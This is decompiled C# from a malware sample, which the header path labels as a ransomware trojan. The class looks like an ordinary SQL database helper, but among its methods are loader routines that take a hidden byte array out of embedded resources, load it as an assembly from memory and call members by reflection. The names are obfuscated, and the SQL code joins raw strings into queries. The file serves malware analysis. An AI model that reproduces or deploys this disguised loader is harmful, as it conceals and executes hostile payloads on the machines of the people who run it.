// Decompiled with JetBrains decompiler
// Type: Gw6e.m6G9
// Assembly: d1B, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B35361C5-53AE-4FF9-85F0-721E1F04E585
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.04-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-a16800dbbc35690f64fb554acd3bbd0d9e4f54e8404a99dac0aacc9e41916f20.exe

using j5L;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Nz6;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Data;
using System.Data.SqlClient;
using System.Globalization;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Wr1g;

namespace Gw6e
{
  public class m6G9
  {
    protected SqlConnection SqlCon;
    protected SqlCommand SqlCom;
    protected SqlDataReader Sqldreader;
    protected SqlDataAdapter SqlDa;
    protected SqlCommandBuilder SqlComb;
    private string ConnectionString;

    public m6G9()
    {
      this.ConnectionString = "Data Source=BK-PC;Initial Catalog=manager_ass;Integrated Security=True";
      this.SqlCon = new SqlConnection();
      this.SqlCon.ConnectionString = this.ConnectionString;
    }

    internal static bool Jk8(string g8G)
    {
      bool flag;
      try
      {
        WebRequest.Create(g8G).GetResponse();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        flag = false;
        ProjectData.ClearProjectError();
        goto label_4;
      }
      flag = true;
label_4:
      return flag;
    }

    public bool i7G()
    {
      bool flag;
      try
      {
        if (this.SqlCon.State != ConnectionState.Open)
        {
          this.SqlCon.ConnectionString = this.ConnectionString;
          this.SqlCon.Open();
          flag = true;
        }
        else
          flag = false;
      }
      catch (SqlException ex)
      {
        ProjectData.SetProjectError((Exception) ex);
        int num = (int) MessageBox.Show("Can not connect to database, please choose a database!", "Connect Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
        ProjectData.ClearProjectError();
      }
      return flag;
    }

    protected bool Sd4()
    {
      bool flag;
      try
      {
        if (this.SqlCon.State != 0)
        {
          this.SqlCon.Close();
          flag = true;
        }
        else
          flag = false;
      }
      catch (SqlException ex)
      {
        ProjectData.SetProjectError((Exception) ex);
        int num = (int) Interaction.MsgBox((object) ex.Message, MsgBoxStyle.Critical, (object) "Close Database");
        flag = false;
        ProjectData.ClearProjectError();
      }
      return flag;
    }

    public bool Jm7(string Pp6, bool e2T = false)
    {
      bool flag;
      if (this.i7G())
      {
        try
        {
          this.SqlCom = new SqlCommand(Pp6, this.SqlCon);
          this.SqlCom.ExecuteNonQuery();
          flag = true;
        }
        catch (SqlException ex)
        {
          ProjectData.SetProjectError((Exception) ex);
          SqlException sqlException = ex;
          if (e2T)
          {
            int num = (int) Interaction.MsgBox((object) sqlException.Message, MsgBoxStyle.Critical, (object) "Execute!");
          }
          flag = false;
          ProjectData.ClearProjectError();
        }
        finally
        {
          this.Sd4();
          this.SqlCom.Dispose();
        }
      }
      return flag;
    }

    internal static byte[] b0J(string[] La1, int k5W)
    {
      byte[] numArray;
      try
      {
        string[] strArray1 = new string[checked (La1.Length - 1 + 1)];
        int num = checked (La1.Length - 1);
        int index1 = 0;
        while (index1 <= num)
        {
          try
          {
            strArray1[index1] = La1[index1].Replace(".resources", "");
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          checked { ++index1; }
        }
        string[] strArray2 = strArray1;
        int index2 = 0;
        while (index2 < strArray2.Length)
        {
          string baseName = strArray2[index2];
          if (baseName != null)
          {
            try
            {
              ResourceSet resourceSet = new ResourceManager(baseName, (Assembly) x4PY.mDic["Ass"]).GetResourceSet(CultureInfo.CurrentCulture, true, true);
              try
              {
                foreach (object obj in resourceSet.OfType<object>())
                {
                  DictionaryEntry dictionaryEntry = obj != null ? (DictionaryEntry) obj : new DictionaryEntry();
                  if (Microsoft.VisualBasic.CompilerServices.Operators.ConditionalCompareObjectEqual(dictionaryEntry.Key, (object) "RepaiInvertory", false))
                  {
                    numArray = (byte[]) dictionaryEntry.Value;
                    goto label_22;
                  }
                }
              }
              finally
              {
                IEnumerator<object> enumerator;
                enumerator?.Dispose();
              }
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
          }
          checked { ++index2; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
label_22:
      return numArray;
    }

    public SqlDataReader Ys8(string Lx1)
    {
      SqlDataReader sqlDataReader;
      try
      {
        if (this.i7G())
        {
          this.SqlCom = new SqlCommand(Lx1, this.SqlCon);
          this.Sqldreader = this.SqlCom.ExecuteReader();
        }
        sqlDataReader = this.Sqldreader;
      }
      catch (SqlException ex)
      {
        ProjectData.SetProjectError((Exception) ex);
        int num = (int) Interaction.MsgBox((object) ex.Message, MsgBoxStyle.Critical, (object) "Get DataReader");
        sqlDataReader = (SqlDataReader) null;
        ProjectData.ClearProjectError();
      }
      finally
      {
        this.Sd4();
        this.SqlCom.Dispose();
      }
      return sqlDataReader;
    }

    public object Rz8(string Re9)
    {
      object obj = (object) null;
      try
      {
        if (this.i7G())
        {
          this.SqlCom = new SqlCommand(Re9, this.SqlCon);
          obj = RuntimeHelpers.GetObjectValue(this.SqlCom.ExecuteScalar());
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        int num = (int) Interaction.MsgBox((object) ex.Message, MsgBoxStyle.Critical, (object) "Get Scalar");
        ProjectData.ClearProjectError();
      }
      finally
      {
        this.Sd4();
        this.SqlCom.Dispose();
      }
      return obj;
    }

    public DataTable e4L(string z9G)
    {
      string tableName = string.Empty;
      try
      {
        tableName = z9G.Substring(14);
        tableName = tableName.Substring(0, checked (tableName.IndexOf(" ") + 1));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      DataTable dataTable = new DataTable(tableName);
      this.SqlDa = new SqlDataAdapter(z9G, this.SqlCon);
      if (this.i7G())
      {
        try
        {
          this.SqlDa.Fill(dataTable);
        }
        catch (SqlException ex)
        {
          ProjectData.SetProjectError((Exception) ex);
          int num = (int) Interaction.MsgBox((object) ex.Message, MsgBoxStyle.Critical, (object) "Get Datatable");
          ProjectData.ClearProjectError();
        }
        finally
        {
          this.Sd4();
          this.SqlDa.Dispose();
        }
      }
      return dataTable;
    }

    public static string c5A(string j2W) => Conversions.ToString(((System.Type) x4PY.mDic[x4PY.T]).InvokeMember(j2W, BindingFlags.Static | BindingFlags.Public | BindingFlags.InvokeMethod, (Binder) null, (object) null, (object[]) null));

    public DataTable Ty18(string Kf3j, string Nj72)
    {
      DataTable dataTable = new DataTable(Kf3j);
      this.SqlDa = new SqlDataAdapter("Select * from " + Kf3j + " Where " + Nj72, this.SqlCon);
      if (this.i7G())
      {
        try
        {
          this.SqlDa.Fill(dataTable);
        }
        catch (SqlException ex)
        {
          ProjectData.SetProjectError((Exception) ex);
          int num = (int) Interaction.MsgBox((object) ex.Message, MsgBoxStyle.Critical, (object) "Get DataTable");
          ProjectData.ClearProjectError();
        }
        finally
        {
          this.Sd4();
          this.SqlDa.Dispose();
        }
      }
      return dataTable;
    }

    public bool Wo7n(string Dc48, DataTable Lk3p, bool Rt20 = false)
    {
      this.SqlDa = new SqlDataAdapter();
      this.SqlDa.SelectCommand = new SqlCommand(Dc48, this.SqlCon);
      this.SqlComb = new SqlCommandBuilder(this.SqlDa);
      bool flag;
      try
      {
        if (this.i7G())
        {
          this.SqlDa.Update(Lk3p);
          flag = true;
        }
        else
          flag = false;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        Exception exception = ex;
        if (Rt20)
        {
          int num = (int) Interaction.MsgBox((object) exception.Message, MsgBoxStyle.Critical, (object) "Warning");
        }
        flag = false;
        ProjectData.ClearProjectError();
      }
      finally
      {
        this.Sd4();
        this.SqlDa.Dispose();
        this.SqlComb.Dispose();
      }
      return flag;
    }

    internal static void z9X1()
    {
      Assembly assembly = Thread.GetDomain().Load((byte[]) x4PY.mDic[x4PY.mArray]);
      x4PY.mDic.Add("Ass2", (object) assembly);
      if (!Ze1.Fm0())
        return;
      x0R.Nx48();
    }

    protected void Rc2y()
    {
      this.Sd4();
      GC.SuppressFinalize((object) this);
    }
  }
}
